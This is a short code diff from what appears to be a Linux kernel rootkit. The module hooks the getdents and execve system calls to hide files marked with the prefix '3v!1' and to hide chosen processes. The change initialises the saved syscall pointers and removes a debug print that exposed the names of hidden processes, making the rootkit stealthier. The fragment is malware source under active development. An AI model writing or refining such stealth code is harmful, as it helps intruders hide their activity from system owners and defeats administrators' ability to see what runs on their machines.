@@ -9,8 +9,8 @@ static char *hide__prefix = "3v!1";
 static struct sctm *hide__sctm = NULL;
 static struct sctm_hook hide__hooks[3];
 static asmlinkage int (*original_getdents)(unsigned int fd,struct linux_dirent* dirp,
-                    unsigned int count);
-static asmlinkage int (*original_execve)(const char *pathname, char *const argv[], char *const envp[]);
+                    unsigned int count) = NULL;
+static asmlinkage int (*original_execve)(const char *pathname, char *const argv[], char *const envp[]) = NULL;
 
 static int addProcessToHide(char* processName);
 static int deleteProcessToHide(char* processName);
@@ -177,7 +177,6 @@ static int addProcessToHide(char* processName){
         if(dynamic_processes_to_hide[i] == NULL){
             dynamic_processes_to_hide[i] = processName;
             arrayListSize++;
-printk("{%s}\n", processName);
             break;
         }
     }
